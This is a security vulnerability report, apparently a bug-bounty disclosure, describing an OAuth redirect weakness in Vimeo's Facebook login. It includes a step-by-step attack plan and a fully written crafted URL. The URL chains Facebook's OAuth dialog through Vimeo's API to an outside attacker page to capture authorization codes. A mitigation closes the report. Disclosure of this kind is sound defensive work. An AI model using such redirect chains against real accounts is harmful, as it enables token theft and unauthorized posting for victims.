## Original Report

Hi,
     vimeo site is using facebook for open authentication . The authentication url is in this way 
https://www.facebook.com/dialog/oauth?client_id=19884028963&redirect_uri=https://vimeo.com/_facebook/join?ssl=0&iframe=0&popup=0&player=0&product_id=0&scope=email,basic_info,read_stream,publish_actions&state=  

problem is that facebook oauth also looks for sub domains  so your app is open to redirect attacks, an attacker could make a plan like this

1)Attacker makes an app with vimeo api
2)And register his redirect_uri as www.prashanthvarma.in/code.php?code=
3)so the redirect_uri for facebook is https://api.vimeo.com/oauth/authorize?response_type=code&client_id=9f3bb9f9186bc825434330567c99283f6dd57586&state=912145450290129&redirect_uri=http://www.prashanthvarma.in/code=

4) the final url for attack is

https://www.facebook.com/dialog/oauth?client_id=19884028963&redirect_uri=https://api.vimeo.com/oauth/authorize%3Fresponse_type%3Dcode%26client_id%3D9f3bb9f9186bc825434330567c99283f6dd57586%26state%3D912145450290129%26redirect_uri%3Dhttp://www.prashanthvarma.in/code=&iframe=0&popup=0&player=0&product_id=0&scope=email,basic_info,read_stream,publish_actions

5) attacker could post ,read stream and do many things with your app ,the above example is just for demonstration .This attack can be done if  an open redirect is found in vimeo domains

solution:
This issue can be solved by using an option in facebook
app_settings>Advanced>Valid OAuth redirect URIs>YOUR_REDIRECT_URI

let me know if any info is required from my end

Thank you,
prashanth varma
